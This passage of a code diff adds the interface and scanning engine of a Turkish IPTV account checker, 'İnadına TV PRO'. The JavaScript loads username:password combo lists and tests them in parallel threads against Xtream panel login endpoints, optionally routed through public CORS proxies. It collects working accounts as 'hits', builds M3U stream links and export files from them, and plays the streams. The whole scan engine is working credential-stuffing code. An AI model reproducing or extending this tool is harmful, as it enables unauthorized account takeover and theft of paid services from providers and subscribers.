+                <div class="panel" id="player-empty-panel"><div class="player-empty"><i class="fas fa-satellite-dish"></i><p style="font-size:1rem;font-weight:600;color:var(--lighter);margin-top:10px;">Oynatıcı Kapalı</p><p style="margin-top:6px;font-size:.83rem;">Oynatıcıyı kullanmak için tarama yapıp Hit bulmalısınız.</p></div></div>
+                <div id="player-panel" style="display:none;">
+                    <div class="player-layout">
+                        <div class="player-sidebar">
+                            <div class="cat-header"><i class="fas fa-users"></i> Hesaplar</div><div class="hit-list" id="hit-list"></div>
+                            <div class="cat-header" style="margin-top:2px;"><i class="fas fa-list"></i> Kategoriler</div><input class="cat-search" id="cat-search" placeholder="Kategori ara..." oninput="filterCats()"><div class="cat-list" id="cat-list"><div style="padding:12px;text-align:center;color:var(--secondary);font-size:.8rem;">Hesap seçin</div></div>
+                            <div class="cat-header" style="margin-top:2px;"><i class="fas fa-tv"></i> Kanallar</div><input class="ch-search" id="ch-search" placeholder="Kanal ara..." oninput="filterChannels()"><div class="ch-list" id="ch-list"><div style="padding:12px;text-align:center;color:var(--secondary);font-size:.8rem;">Kategori seçin</div></div>
+                        </div>
+                        <div class="player-main">
+                            <div class="video-wrap" id="video-wrap">
+                                <div class="video-placeholder" id="video-placeholder"><i class="fas fa-play-circle"></i><span>Kanal seçimi bekleniyor</span></div>
+                                <video id="main-video" style="display:none;" controls autoplay playsinline></video>
+                            </div>
+                            <div class="now-playing" id="now-playing" style="display:none;"><div class="np-title" id="np-title">—</div><div class="np-meta"><span id="np-cat"></span><span id="np-server"></span></div></div>
+                            <div class="player-controls">
+                                <button class="btn btn-secondary btn-sm" onclick="toggleFullscreen()"><i class="fas fa-expand"></i> Tam Ekran</button>
+                                <button class="btn btn-sm vlc-color" onclick="openIntent('org.videolan.vlc')" style="font-weight:bold;"><i class="fas fa-external-link-alt"></i> VLC Player</button>
+                                <button class="btn btn-sm wuffy-color" onclick="openIntent('co.wuffy.player')" style="font-weight:bold;"><i class="fas fa-external-link-alt"></i> Wuffy Player</button>
+                            </div>
+                            <div class="now-playing" style="font-size:.73rem;padding:8px 14px;opacity:.6;"><i class="fas fa-info-circle"></i> Görüntü takılırsa veya ses gelmezse yayını Wuffy veya VLC Player'a aktararak donmadan izleyebilirsiniz.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+<div class="modal" id="help-modal">
+    <div class="modal-content">
+        <button class="modal-close" id="modal-close">×</button>
+        <h2 class="modal-title"><i class="fas fa-rocket"></i> İnadına TV PRO v5.9 - Rehber</h2>
+        <div class="modal-body">
+            <h3><i class="fas fa-folder-open"></i> Kategori / Klasör Görünümü</h3>
+            <p>Sonuçlar sekmesinde artık "Panellere Göre Klasörleme" teknolojisi kullanılıyor. Her bulunan hesap ait olduğu panelin içine düşer. Klasör başlığında <b>Panel Adresi ve Toplam Hit Sayısı</b> yer alır. Başlığa tıklayarak listeyi açıp kapatabilirsiniz.</p><p style="margin-top:12px;"><i class="fas fa-download"></i> Dışa aktarma, AppCreator24 WebView içinde kalmaması için harici tarayıcıda açılır.</p><p style="margin-top:8px;"><i class="fas fa-tv"></i> Geniş ekran ve TV Box kumandası için odak çerçevesi ve büyük dokunma alanları aktiftir.</p>
+        </div>
+    </div>
+</div>
+
+<div class="notification" id="notification"></div>
+
+<script>
+// =============================================
+// GLOBAL STATE & VARIABLES
+// =============================================
+const state = {
+    running: false, stopRequested: false, activeJobs: 0,
+    stats: { total: 0, hits: 0, errors: 0, active: 0, speed: 0, dirty: false },
+    results: [], slots:[], slotIdCounter: 0,
+    currentTab: 0, isDark: true, exportData: '',
+    lastReqTime: Date.now(), rpsTimer: null, uiUpdateTimer: null,
+    scanMode: 'parallel', currentHostsCount: 1
+};
+
+const $ = id => document.getElementById(id);
+
+// =============================================
+// URL PARSER
+// =============================================
+function getBaseUrl(input) {
+    let val = input.trim();
+    if (!val) return null;
+    if (!/^https?:\/\//i.test(val)) val = 'http://' + val; 
+    try {
+        const u = new URL(val);
+        return u.protocol + '//' + u.host; 
+    } catch(e) { return null; }
+}
+
+// =============================================
+// INIT & EVENT LISTENERS
+// =============================================
+document.addEventListener('DOMContentLoaded', () => {
+    if (localStorage.getItem('theme') === 'light') enableLight();
+    changeTab(0); addComboSlot();
+    state.uiUpdateTimer = setInterval(batchUpdateUI, 500);
+
+    $('help-btn').addEventListener('click', () => { 
+        $('help-modal').style.display='flex'; setTimeout(()=>$('help-modal').classList.add('show'),10); 
+    });
+    $('modal-close').addEventListener('click', () => { 
+        $('help-modal').classList.remove('show'); setTimeout(()=>$('help-modal').style.display='none',300); 
+    });
+    window.addEventListener('click', e => { 
+        if (e.target === $('help-modal')) { 
+            $('help-modal').classList.remove('show'); setTimeout(()=>$('help-modal').style.display='none',300); 
+        } 
+    });
+});
+
+$('start-btn').addEventListener('click', startScan);
+$('stop-btn').addEventListener('click', stopScan);
+$('clear-btn').addEventListener('click', clearAll);
+$('theme-toggle').addEventListener('click', () => state.isDark ? enableLight() : enableDark());
+$('test-btn').addEventListener('click', testConnection);
+$('gen-export-btn').addEventListener('click', generateExport);
+$('dl-export-btn').addEventListener('click', downloadExport);
+
+$('copy-all-btn').addEventListener('click', () => {
+    if(!state.results.length) { showNotif("Kopyalanacak sonuç yok!", "error"); return; }
+    let txt = "🔥 İNADINA TV PRO - TARAMA SONUÇLARI 🔥\n\n";
+    state.results.forEach(r => {
+        let m3u = `${r.host}/get.php?username=${r.user}&password=${r.pass}&type=m3u_plus&output=ts`;
+        txt += `🌐 Sunucu: ${r.host}\n👤 Hesap: ${r.user}:${r.pass}\n📅 Durum/Bitiş: ${r.status} / ${r.exp_date}\n├●👩 Aktif Bağlantı ➤ ${r.active_cons}\n├●👪 Maximum Bağlantı ➤ ${r.max_conn}\n📺 M3U Linki: ${m3u}\n${"-".repeat(40)}\n`;
+    });
+    copyText(txt, "Tüm sonuçlar kopyalandı!");
+});
+$('copy-combo-btn').addEventListener('click', () => {
+    if(!state.results.length) { showNotif("Yok!", "error"); return; }
+    copyText(state.results.map(r => `${r.user}:${r.pass}`).join('\n'), "Combo (User:Pass) kopyalandı!");
+});
+
+document.querySelectorAll('.tab').forEach(t => t.addEventListener('click', () => changeTab(+t.dataset.tab)));
+
+// Android TV / TV Box kumandalarının yön tuşlarıyla sekmeler arasında gezinme.
+document.addEventListener('keydown', e => {
+    if (['INPUT','TEXTAREA','SELECT'].includes(document.activeElement?.tagName)) return;
+    const tabs = [...document.querySelectorAll('.tab')];
+    const current = tabs.indexOf(document.activeElement);
+    if (current < 0) return;
+    if (e.key === 'ArrowRight' || e.key === 'ArrowDown') { e.preventDefault(); tabs[(current + 1) % tabs.length].focus(); }
+    if (e.key === 'ArrowLeft' || e.key === 'ArrowUp') { e.preventDefault(); tabs[(current - 1 + tabs.length) % tabs.length].focus(); }
+    if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); tabs[current].click(); }
+});
+
+let tx0=0, ty0=0, swiping=false;
+$('tab-wrapper').addEventListener('touchstart', e => { tx0=e.touches[0].clientX; ty0=e.touches[0].clientY; swiping=true; }, {passive:true});
+$('tab-wrapper').addEventListener('touchend', e => {
+    if(!swiping) return; swiping=false;
+    let dx = e.changedTouches[0].clientX - tx0, dy = e.changedTouches[0].clientY - ty0;
+    if(Math.abs(dx) > Math.abs(dy) && Math.abs(dx) > 60) {
+        if(dx < 0 && state.currentTab < 4) changeTab(state.currentTab + 1);
+        else if(dx > 0 && state.currentTab > 0) changeTab(state.currentTab - 1);
+    }
+}, {passive:true});
+
+function changeTab(i) {
+    state.currentTab = i;
+    document.querySelectorAll('.tab').forEach((t, j) => t.classList.toggle('active', j === i));
+    $('tab-slider').style.transform = `translateX(-${i * 100}%)`;
+    if (i === 4) { ensureHlsJs(); refreshPlayerHitList(); }
+}
+
+function setScanMode(m) {
+    state.scanMode = m;
+    $('mode-seq').classList.toggle('active', m === 'sequential');
+    $('mode-par').classList.toggle('active', m === 'parallel');
+}
+
+// =============================================
+// FAST PANEL TEST ENGINE (NO-CORS HEAD)
+// Sadece Test Bölümünde Kullanılır (Tarama esnasında aranmaz)
+// =============================================
+async function testPanelStatusFast(base) {
+    let timeout = 5000;
+    let testUrls = [`${base}/player_api.php`, `${base}/panel_api.php`, base];
+    
+    for (let url of testUrls) {
+        try {
+            let controller = new AbortController();
+            let tid = setTimeout(() => controller.abort(), timeout);
+            await fetch(url, { method: 'HEAD', signal: controller.signal, mode: 'no-cors' });
+            clearTimeout(tid);
+            return true; 
+        } catch (e) { }
+    }
+    return false;
+}
+
+// =============================================
+// MULTI CONNECTION TEST UI (YENİ PENCERE)
+// =============================================
+async function testConnection() {
+    let rawInput = $('test-host').value;
+    let urls = rawInput.split(/[\n,]+/).map(u => getBaseUrl(u)).filter(u => u);
+    
+    if(urls.length === 0) { showNotif("Lütfen test edilecek en az bir URL girin!", "error"); return; }
+    
+    $('test-host').value = urls.join('\n');
+    let container = $('test-log-container');
+    let logBox = $('multi-test-results');
+    
+    container.style.display = 'block';
+    logBox.innerHTML = '';
+    $('add-all-working-btn').style.display = 'none';
+    $('test-btn').disabled = true;
+
+    let workingUrls = [];
+    let offlineCount = 0;
+
+    for (let i = 0; i < urls.length; i++) {
+        let base = urls[i];
+        
+        let row = document.createElement('div');
+        row.className = 'm-test-row testing';
+        row.innerHTML = `<span class="m-test-url">${base}</span><span class="m-test-status" style="color:var(--warning)"><i class="fas fa-spinner fa-spin"></i> Deneniyor</span>`;
+        logBox.appendChild(row);
+        logBox.scrollTop = logBox.scrollHeight;
+        
+        $('test-stats').innerHTML = `Test ediliyor: <b>${i + 1} / ${urls.length}</b>`;
+
+        let isOnline = await testPanelStatusFast(base);
+
+        if (isOnline) {
+            row.className = 'm-test-row online';
+            row.innerHTML = `<span class="m-test-url">${base}</span><span class="m-test-status" style="color:var(--success)"><i class="fas fa-check-circle"></i> Aktif</span>`;
+            workingUrls.push(base);
+            addLog(`[HIZLI TEST] ${base} -> AKTİF`, 'success');
+        } else {
+            row.className = 'm-test-row offline';
+            row.innerHTML = `<span class="m-test-url">${base}</span><span class="m-test-status" style="color:var(--error)"><i class="fas fa-times-circle"></i> Kapalı</span>`;
+            offlineCount++;
+            addLog(`[HIZLI TEST] ${base} -> ULAŞILAMADI`, 'error');
+        }
+        logBox.scrollTop = logBox.scrollHeight;
+    }
+
+    $('test-stats').innerHTML = `Sonuç: <span style="color:var(--success)">${workingUrls.length} Aktif</span> | <span style="color:var(--error)">${offlineCount} Kapalı</span>`;
+
+    if (workingUrls.length > 0) {
+        let addAllBtn = $('add-all-working-btn');
+        addAllBtn.style.display = 'inline-flex';
+        addAllBtn.onclick = () => addToScanList(workingUrls);
+    } else {
+        showNotif("Maalesef hiç çalışan panel bulunamadı.", "error");
+    }
+    $('test-btn').disabled = false;
+}
+
+function addToScanList(newUrls) {
+    let currentStr = $('host').value.trim();
+    let currentUrls = currentStr ? currentStr.split(',').map(s => s.trim()) : [];
+    let addedCount = 0;
+
+    for (let url of newUrls) {
+        if (!currentUrls.includes(url)) {
+            currentUrls.push(url);
+            addedCount++;
+        }
+    }
+    $('host').value = currentUrls.join(', ');
+
+    if (addedCount > 0) {
+        showNotif(`${addedCount} adet çalışan panel tarama listesine eklendi!`, "success");
+        $('host').style.boxShadow = "0 0 0 2px var(--success)";
+        setTimeout(() => $('host').style.boxShadow = "none", 1000);
+    } else {
+        showNotif("Bu paneller zaten tarama listesinde mevcut!", "warning");
+    }
+}
+
+// =============================================
+// COMBO SLOT MANAGEMENT
+// =============================================
+function addComboSlot() {
+    if (state.slots.length >= 5) return;
+    state.slots.push({ id: ++state.slotIdCounter, name: `Liste ${state.slotIdCounter}`, combos:[], processed: 0, hits: 0, errors: 0, status: 'waiting' });
+    renderSlots();
+}
+function removeSlot(id) { state.slots = state.slots.filter(s => s.id !== id); renderSlots(); }
+function loadFile(e, id) {
+    const f = e.target.files[0]; if (!f) return;
+    const s = state.slots.find(x => x.id === id); if (!s) return;
+    const reader = new FileReader();
+    reader.onload = ev => {
+        s.combos = ev.target.result.split('\n').map(l => l.trim()).filter(l => l.includes(':') && l.length > 4);
+        s.name = f.name.replace(/\.txt$/i, '').substring(0,20);
+        s.processed = s.hits = s.errors = 0; s.status = 'waiting';
+        renderSlots(); showNotif(`${s.name} yüklendi (${s.combos.length} adet)`, 'success');
+    };
+    reader.readAsText(f);
+}
+function renderSlots() {
+    const c = $('combo-slots');
+    if (!state.slots.length) { c.innerHTML = ''; return; }
+    c.innerHTML = state.slots.map(s => {
+        let ops = s.combos.length * state.currentHostsCount;
+        let pct = ops ? (s.processed/ops*100) : 0;
+        let bCls = s.status==='scanning'?'badge-scanning':(s.status==='done'?'badge-done':'badge-waiting');
+        let bLbl = s.status==='scanning'?'Tarıyor':(s.status==='done'?'Bitti':'Bekliyor');
+        return `<div class="combo-slot" id="slot-${s.id}">
+            <div class="combo-slot-header">
+                <div class="combo-slot-name"><i class="fas fa-file-alt" style="color:var(--accent)"></i> ${escHtml(s.name)} <span class="combo-badge ${bCls}" id="sb-${s.id}">${bLbl}</span></div>
+                <div class="combo-slot-actions">
+                    <label class="btn btn-sm btn-info" style="margin:0;cursor:pointer;"><i class="fas fa-upload"></i> Seç<input type="file" accept=".txt" style="display:none;" onchange="loadFile(event,${s.id})"></label>
+                    <button class="btn btn-sm btn-danger" style="margin:0;" onclick="removeSlot(${s.id})"><i class="fas fa-trash"></i></button>
+                </div>
+            </div>
+            <div class="combo-slot-info" id="si-${s.id}">
+                <span><i class="fas fa-list"></i> ${s.combos.length} <small>(x${state.currentHostsCount})</small></span>
+                <span style="color:var(--success)"><i class="fas fa-check"></i> ${s.hits}</span>
+                <span style="color:var(--error)"><i class="fas fa-times"></i> ${s.errors}</span>
+            </div>
+            <div class="combo-prog-mini"><div class="combo-prog-fill" id="sp-${s.id}" style="width:${pct}%"></div></div>
+        </div>`;
+    }).join('');
+    $('total-label').textContent = `${state.slots.reduce((a,b)=>a+b.combos.length,0)} kombo`;
+}
+function batchUpdateUI() {
+    if (!state.running && !state.stats.dirty) return;
+    let t = state.slots.reduce((a,b)=>a+(b.combos.length * state.currentHostsCount),0);
+    let pct = t > 0 ? (state.stats.total / t * 100) : 0;
+    $('progress-fill').style.width = `${pct}%`; $('progress-text').textContent = `${pct.toFixed(1)}%`;
+    $('s-total').textContent = state.stats.total; $('s-hits').textContent = state.stats.hits;
+    $('s-errors').textContent = state.stats.errors; $('s-active').textContent = state.stats.active;
+    $('s-remain').textContent = Math.max(0, t - state.stats.total);
+    state.slots.forEach(s => {
+        let el = $(`sp-${s.id}`);
+        if(el) {
+            let ops = s.combos.length * state.currentHostsCount;
+            el.style.width = (ops ? (s.processed/ops*100) : 0) + '%';
+            $(`si-${s.id}`).innerHTML = `<span><i class="fas fa-list"></i> ${s.combos.length}</span> <span style="color:var(--success)"><i class="fas fa-check"></i> ${s.hits}</span> <span style="color:var(--error)"><i class="fas fa-times"></i> ${s.errors}</span>`;
+            let badge = $(`sb-${s.id}`);
+            if(s.status === 'scanning') { badge.className='combo-badge badge-scanning'; badge.textContent='Tarıyor'; }
+            else if(s.status === 'done') { badge.className='combo-badge badge-done'; badge.textContent='Bitti'; }
+        }
+    });
+    state.stats.dirty = false;
+}
+
+// =============================================
+// PARALLEL SCAN ENGINE (Direkt Atılım Yapar)
+// =============================================
+async function startScan() {
+    let hostsRaw = $('host').value.split(',').map(h => h.trim()).filter(h => h);
+    let rawHosts = hostsRaw.map(h => getBaseUrl(h)).filter(h => h);
+    if(rawHosts.length === 0) { showNotif("En az bir URL girin!", "error"); return; }
+    
+    $('host').value = rawHosts.join(', '); 
+    const validSlots = state.slots.filter(s => s.combos.length > 0);
+    if (!validSlots.length) { showNotif("Kombo listesi ekleyin", "warning"); return; }
+
+    state.running = true; state.stopRequested = false;
+    $('start-btn').disabled = true; $('stop-btn').disabled = false;
+    $('start-btn').innerHTML = '<i class="fas fa-cog fa-spin"></i> Taranıyor...';
+
+    // Ön test ve beklemeyi sildik, direkt işleme geçiliyor
+    let pMode = $('cors-proxy').value;
+    let resolvedHosts = rawHosts.map(h => ({ url: h, proxy: pMode }));
+
+    state.currentHostsCount = resolvedHosts.length;
+
+    state.stats = { total: 0, hits: 0, errors: 0, active: 0, speed: 0, dirty: true };
+    state.results = [];
+    validSlots.forEach(s => { s.processed = s.hits = s.errors = 0; s.status = 'waiting'; });
+    
+    renderSlots(); renderResults(); changeTab(1); 
+
+    clearInterval(state.rpsTimer);
+    state.rpsTimer = setInterval(() => {
+        let now = Date.now();
+        state.stats.speed = state.stats.active > 0 ? ((1000 / (now - state.lastReqTime)) * state.stats.active).toFixed(1) : 0;
+        $('s-speed').textContent = state.stats.speed;
+        state.lastReqTime = now;
+    }, 1000);
+
+    let maxThreads = parseInt($('threads').value) || 12;
+    state.activeJobs = 0;
+
+    addLog(`[MOTOR] ${resolvedHosts.length} Panel ve ${validSlots.length} Liste Taranıyor. Thread: ${maxThreads}`, 'info');
+
+    // PARALEL veya SIRALI Mod Seçimine Göre Çalıştırma
+    if (state.scanMode === 'sequential') {
+        let threadsPerJob = maxThreads;
+        for (let slot of validSlots) {
+            if (state.stopRequested) break;
+            for (let hostData of resolvedHosts) {
+                if (state.stopRequested) break;
+                state.activeJobs++;
+                await runJob(hostData, slot, threadsPerJob);
+            }
+        }
+    } else {
+        // Tüm Kombinasyonları Hesapla ve Dağıt
+        let jobPromises = [];
+        let totalJobs = validSlots.length * resolvedHosts.length;
+        let threadsPerJob = Math.max(1, Math.floor(maxThreads / totalJobs));
+        
+        for (let slot of validSlots) {
+            for (let hostData of resolvedHosts) {
+                state.activeJobs++;
+                jobPromises.push(runJob(hostData, slot, threadsPerJob));
+            }
+        }
+        await Promise.all(jobPromises);
+    }
+
+    clearInterval(state.rpsTimer); 
+    $('start-btn').disabled = false; $('stop-btn').disabled = true;
+    $('start-btn').innerHTML = '<i class="fas fa-play"></i> TARAMAYI BAŞLAT';
+    state.running = false; batchUpdateUI();
+    if(!state.stopRequested) {
+        addLog(`[MOTOR] Tarama Bitti! Toplam Hit: ${state.stats.hits}`, 'hit');
+        showNotif(`Tarama Bitti! ${state.stats.hits} hit bulundu.`, 'success');
+    }
+}
+
+// Bireysel Job (İş Parçacığı Yönetimi)
+async function runJob(hostData, slot, threadsPerJob) {
+    if(slot.status === 'waiting') slot.status = 'scanning';
+    let total = slot.combos.length;
+    let index = 0;
+    
+    async function worker() {
+        while (state.running && !state.stopRequested && index < total) {
+            let combo = slot.combos[index++];
+            state.stats.active++;
+            state.stats.dirty = true;
+            
+            try {
+                let res = await checkAccount(hostData.url, combo, slot.name, hostData.proxy);
+                state.stats.total++; slot.processed++;
+                if (res && res.hit) {
+                    state.stats.hits++; slot.hits++;
+                    state.results.push(res.data);
+                    appendResultDOM(res.data);
+                    addLog(`[HIT] ${res.data.user} - Panel: ${hostData.url}`, 'hit');
+                }
+            } catch(e) {
+                // Timeout veya erişim sorunu: hataları arka planda say, logu kirletme
+                state.stats.total++; slot.processed++; state.stats.errors++; slot.errors++;
+            }
+            
+            state.stats.active--;
+            state.stats.dirty = true;
+            
+            // Eğer proxy yoksa, CPU dinlendirmesi (Tarayıcının kitlenmemesi için)
+            if (hostData.proxy === 'none') {
+                await new Promise(r => setTimeout(r, 10 + Math.random() * 20));
+            } else if (hostData.proxy === 'codetabs') {
+                await new Promise(r => setTimeout(r, 150));
+            } else {
+                await new Promise(r => setTimeout(r, 250));
+            }
+        }
+    }
+    
+    let workers = [];
+    for (let i = 0; i < threadsPerJob && i < total; i++) workers.push(worker());
+    await Promise.all(workers);
+    
+    state.activeJobs--;
+    if (slot.processed >= slot.combos.length * state.currentHostsCount) {
+        slot.status = 'done';
+    }
+}
+
+// =============================================
+// YENİ XTREAM JSON DENETLEYİCİ (Auth === 1 Mantığı)
+// =============================================
+async function checkAccount(host, combo, source, proxyMode) {
+    state.lastReqTime = Date.now();
+    let pts = combo.split(':');
+    if(pts.length < 2) return { hit: false };
+    let u = encodeURIComponent(pts[0].trim());
+    let p = encodeURIComponent(pts.slice(1).join(':').trim());
+    
+    let targetUrl = `${host}/player_api.php?username=${u}&password=${p}`;
+    let finalUrl = targetUrl;
+    
+    if (proxyMode === 'corsproxy') finalUrl = `https://corsproxy.io/?${encodeURIComponent(targetUrl)}`;
+    else if (proxyMode === 'codetabs') finalUrl = `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(targetUrl)}`;
+    else if (proxyMode === 'allorigins') finalUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(targetUrl)}`;
+
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 9000); // 9 saniye Xtream zaman aşımı
+
+    try {
+        let r = await fetch(finalUrl, { signal: controller.signal, cache: 'no-store' });
+        clearTimeout(timeoutId);
+        
+        if (!r.ok) return { hit: false }; // Ölüyse hata atma, sessizce geç
+        
+        let data = await r.json(); // Hızlıca JSON parse et
+        
+        // XTREAM AUTH === 1 DENETİMİ (En Kesin Yöntem)
+        if (data && data.user_info && data.user_info.auth === 1) {
+            let i = data.user_info;
+            let statusRaw = i.status ? String(i.status).toLowerCase() : 'active';
+            
+            // Eğer banlı vs değilse al
+            if (statusRaw === 'active' || statusRaw === 'trial') {
+                let expStr = 'Sınırsız';
+                if (i.exp_date && i.exp_date !== "null" && i.exp_date !== "0") {
+                    expStr = new Date(i.exp_date * 1000).toLocaleString('tr-TR');
+                }
+                return {
+                    hit: true,
+                    data: {
+                        source, host, user: decodeURIComponent(u), pass: decodeURIComponent(p),
+                        status: i.status || 'Active', 
+                        exp_date: expStr,
+                        max_conn: i.max_connections || '0', active_cons: i.active_cons || '0',
+                        proxyMode: proxyMode 
+                    }
+                };
+            }
+        }
+        return { hit: false };
+    } catch(err) { 
+        clearTimeout(timeoutId); 
+        throw err; 
+    }
+}
+
+function stopScan() {
+    state.stopRequested = true; $('start-btn').disabled = false; $('stop-btn').disabled = true;
+    $('start-btn').innerHTML = '<i class="fas fa-play"></i> TARAMAYI BAŞLAT';
+    addLog('[MOTOR] Tarama durdurma sinyali gönderildi...', 'warn');
+}
+
+// =============================================
+// YENİ: KATEGORİZE EDİLMİŞ KLASÖR GÖRÜNÜMLÜ HİT DOM YAPISI
+// =============================================
+function appendResultDOM(r) {
+    $('results-count').textContent = `(${state.results.length})`;
+    let list = $('results-list');
+    
+    // Boş durumu temizle
+    if(state.results.length === 1) list.innerHTML = ''; 
+
+    // Panel için benzersiz bir ID oluştur (Sadece harf ve rakam)
+    let panelId = 'pg-' + r.host.replace(/[^a-zA-Z0-9]/g, '');
+    let group = $(panelId);
+
+    // Eğer o panelin klasörü yoksa yeni oluştur
+    if (!group) {
+        group = document.createElement('div');
+        group.className = 'panel-group open'; // Varsayılan olarak açık gelsin
+        group.id = panelId;
+        
+        group.innerHTML = `
+            <div class="panel-group-header" onclick="this.parentElement.classList.toggle('open')">
+                <div class="pg-title-wrap">
+                    <i class="fas fa-server" style="color:var(--accent)"></i>
+                    <span>${r.host}</span>
+                </div>
+                <div style="display:flex; align-items:center; gap:10px;">
+                    <div class="panel-group-badge" id="${panelId}-count">1 Hit</div>
+                    <i class="fas fa-chevron-down" style="color:var(--secondary);font-size:0.8rem;"></i>
+                </div>
+            </div>
+            <div class="panel-group-body" id="${panelId}-body"></div>
+        `;
+        list.prepend(group);
+    } else {
+        // Zaten klasör varsa sayacı güncelle
+        let countSpan = $(`${panelId}-count`);
+        let currentCount = parseInt(countSpan.textContent) || 0;
+        countSpan.textContent = `${currentCount + 1} Hit`;
+    }
+
+    // Klasörün içine eklenecek hesap detay kartı
+    let el = document.createElement('div');
+    el.className = 'result-item';
+    el.innerHTML = `
+        <div class="result-header-row" style="margin-bottom:6px;">
+            <div class="result-title" style="font-size:0.9rem;"><i class="fas fa-user-circle"></i> ${r.user}</div>
+            <div style="display:flex;gap:6px;align-items:center; flex-wrap:wrap;">
+                <span class="source-tag">${escHtml(r.source)}</span>
+                <button class="btn btn-sm btn-success copy-btn" style="margin:0;padding:4px 8px;font-size:0.7rem;"><i class="fas fa-copy"></i> Kopyala</button>
+                <button class="btn btn-sm btn-info play-btn" style="margin:0;padding:4px 8px;font-size:0.7rem;"><i class="fas fa-play"></i> Oynat</button>
+            </div>
+        </div>
+        <div class="result-content" style="grid-template-columns: repeat(auto-fill,minmax(200px,1fr));">
+            <div class="result-field"><span class="field-label"><i class="fas fa-key"></i> Şifre</span> <span class="field-value">${r.pass}</span></div>
+            <div class="result-field"><span class="field-label"><i class="fas fa-calendar-times"></i> Bitiş</span> <span class="field-value" style="color:var(--accent);font-weight:bold;">${r.exp_date}</span></div>
+            <div class="result-field"><span class="field-label"><i class="fas fa-plug"></i> Bağlantı</span> <span class="field-value">${r.active_cons} / ${r.max_conn}</span></div>
+            <div class="result-field"><span class="field-label"><i class="fas fa-info-circle"></i> Durum</span> <span class="field-value">${r.status}</span></div>
+        </div>
+    `;
+
+    el.querySelector('.copy-btn').onclick = () => {
+        let m3u = `${r.host}/get.php?username=${r.user}&password=${r.pass}&type=m3u_plus&output=ts`;
+        let txt = `🌐 Sunucu: ${r.host}\n👤 Hesap: ${r.user}:${r.pass}\n📅 Durum/Bitiş: ${r.status} / ${r.exp_date}\n├●👩 Aktif Bağlantı ➤ ${r.active_cons}\n├●👪 Maximum Bağlantı ➤ ${r.max_conn}\n📺 M3U Linki: ${m3u}`;
+        copyText(txt, "Hesap kopyalandı!");
+    };
+    el.querySelector('.play-btn').onclick = () => { changeTab(4); loadHitIntoPlayer(r); };
+    
+    // Oluşturulan hit'i kendi klasörünün body alanına ekle
+    $(`${panelId}-body`).prepend(el);
+}
+
+function renderResults() {
+    $('results-list').innerHTML = '<div style="text-align:center;padding:30px;color:var(--secondary);"><p><i class="fas fa-inbox" style="font-size:2rem;opacity:.3;"></i></p><p>Sonuçlar temizlendi.</p></div>';
+    $('results-count').textContent = '(0)';
+}
+
+function clearAll() {
+    stopScan();
+    state.slots = []; state.results =[]; state.stats = { total: 0, hits: 0, errors: 0, active: 0, speed: 0, dirty: true };
+    renderSlots(); renderResults(); batchUpdateUI();
+    $('test-log-container').style.display = 'none';
+    $('add-all-working-btn').style.display = 'none';
+    addLog('[SİSTEM] Temizlendi.', 'info');
+}
+
+function addLog(msg, type) {
+    let sl = $('scan-log'); let el = document.createElement('div'); el.className = `log-line log-${type}`;
+    el.textContent = `[${new Date().toLocaleTimeString('tr-TR')}] ${msg}`;
+    sl.appendChild(el);
+    if(sl.children.length > 100) sl.removeChild(sl.firstChild);
+    sl.scrollTop = sl.scrollHeight;
+}
+function clearLog() { $('scan-log').innerHTML = ''; }
+function showNotif(msg, type) {
+    let n = $('notification'); n.innerHTML = msg; n.className = `notification ${type} show`;
+    setTimeout(()=>n.classList.remove('show'), 3000);
+}
+function escHtml(s) { return String(s).replace(/&/g,'&').replace(/</g,'<').replace(/>/g,'>'); }
+function copyText(txt, msg) { navigator.clipboard.writeText(txt).then(()=>showNotif(msg,'success')).catch(()=>showNotif('Hata','error')); }
+
+function generateExport() {
+    if(!state.results.length) return;
+    let format = $('exp-format').value; let txt = "";
+    if(format === 'simple') state.results.forEach(r => txt += `${r.user}:${r.pass}\n`);
+    else if(format === 'detailed') {
+        state.results.forEach(r => {
+            txt += `🌐 Sunucu: ${r.host}\n👤 Hesap: ${r.user}:${r.pass}\n📅 Durum: ${r.status} | Bitiş: ${r.exp_date}\n📺 M3U: ${r.host}/get.php?username=${r.user}&password=${r.pass}&type=m3u_plus&output=ts\n${"-".repeat(40)}\n`;
+        });
+    }
+    else if(format === 'm3u') {
+        txt = "#EXTM3U\n";
+        state.results.forEach(r => txt += `#EXTINF:-1,${r.user}\n${r.host}/get.php?username=${r.user}&password=${r.pass}&type=m3u_plus&output=ts\n`);
+    }
+    $('exp-preview').value = txt; state.exportData = txt; $('dl-export-btn').disabled = false;
+}
+function toBase64Utf8(value) {
+    const bytes = new TextEncoder().encode(value);
+    let binary = '';
+    for (let i = 0; i < bytes.length; i += 0x8000) binary += String.fromCharCode(...bytes.subarray(i, i + 0x8000));
+    return btoa(binary);
+}
+
+function downloadExport() {
+    if (!state.exportData) { showNotif("Önce dosyayı hazırlayın!", "warning"); return; }
+    const format = $('exp-format').value === 'm3u' ? 'm3u' : 'txt';
+    const filename = `iptv_hitler.${format}`;
+    const encoded = encodeURIComponent(toBase64Utf8(state.exportData));
+    const externalUrl = `https://iptvbot-t6zv.vercel.app/download/?type=${format}&name=${encodeURIComponent(filename)}#${encoded}`;
+
+    // AppCreator24 yalnızca gerçek HTTPS bağlantılarını External Link olarak açar.
+    const a = document.createElement('a');
+    a.href = externalUrl; a.target = '_blank'; a.rel = 'noopener noreferrer';
+    a.setAttribute('aria-label', 'Çıktıyı harici tarayıcıda aç ve indir');
+    document.body.appendChild(a); a.click(); a.remove();
+    showNotif('Harici tarayıcıda indirme sayfası açılıyor.', 'success');
+}
+function enableLight() { document.body.classList.add('light-theme'); $('theme-toggle').innerHTML='<i class="fas fa-sun"></i>'; state.isDark=false; localStorage.setItem('theme','light');}
+function enableDark() { document.body.classList.remove('light-theme'); $('theme-toggle').innerHTML='<i class="fas fa-moon"></i>'; state.isDark=true; localStorage.setItem('theme','dark');}
+
+// =============================================
+// PLAYER MOTORU
+// =============================================
+let activeHit = null;
+
+function refreshPlayerHitList() {
+    const hl = $('hit-list');
+    if(!state.results.length) { $('player-empty-panel').style.display=''; $('player-panel').style.display='none'; return; }
+    $('player-empty-panel').style.display='none'; $('player-panel').style.display='';
+    
+    hl.innerHTML = state.results.map((r,i) => `
+        <div class="hit-item" onclick='loadHitIntoPlayer(${JSON.stringify(r).replace(/'/g, "\\'")})'>
